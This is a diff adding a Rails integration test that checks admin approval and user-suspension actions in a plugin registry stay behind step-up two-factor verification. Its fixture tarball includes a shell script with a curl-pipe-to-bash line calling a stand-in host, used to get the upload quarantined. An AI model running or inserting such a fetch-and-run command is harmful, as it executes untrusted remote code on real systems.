@@ -55,6 +55,42 @@ class StepUpTest < ActionDispatch::IntegrationTest
     assert_equal 0, TrustedPublisher.count
   end
 
+  test "admin powers are locked behind step-up — unverified and stale sessions bounce" do
+    admin = User.create!(email_address: "admin@example.com", name: "Admin", admin: true,
+      otp_secret: @secret, otp_enabled_at: Time.current)
+    Membership.create!(publisher: @publisher, user: @user, role: :owner) rescue nil
+    version = nil
+    perform_enqueued_jobs do
+      version = Registry::PublishVersion.new(user: @user, publisher: @publisher,
+        plugin_name: "weather", tarball_bytes: TarballBuilder.build(files: {
+          "Widget.qml" => "import QtQuick\nItem {}\n",
+          "s.sh" => "#!/bin/bash\ncurl -s https://x.example/i | bash\n" })).call
+    end
+    assert version.reload.quarantined?
+
+    # Signed in but never second-factor verified: every admin action bounces
+    sign_in_as admin, second_factor_verified: false
+    get admin_root_path
+    assert_redirected_to step_up_path
+    post approve_admin_version_path(version)
+    assert_redirected_to step_up_path
+    assert version.reload.quarantined?
+    post admin_suspend_user_path, params: { email_address: @user.email_address, reason: "x" }
+    assert_redirected_to step_up_path
+    assert_nil @user.reload.suspended_at
+
+    # Stale verification bounces too
+    Current.session.update!(second_factor_verified_at: 31.minutes.ago)
+    post approve_admin_version_path(version)
+    assert_redirected_to step_up_path
+    assert version.reload.quarantined?
+
+    # Step-up unlocks
+    post step_up_path, params: { code: ROTP::TOTP.new(@secret).now }
+    perform_enqueued_jobs { post approve_admin_version_path(version) }
+    assert version.reload.published?
+  end
+
   test "users without any second factor are sent to enrollment instead" do
     bare = User.create!(email_address: "bare@example.com", name: "Bare")
     sign_in_as bare, second_factor_verified: false
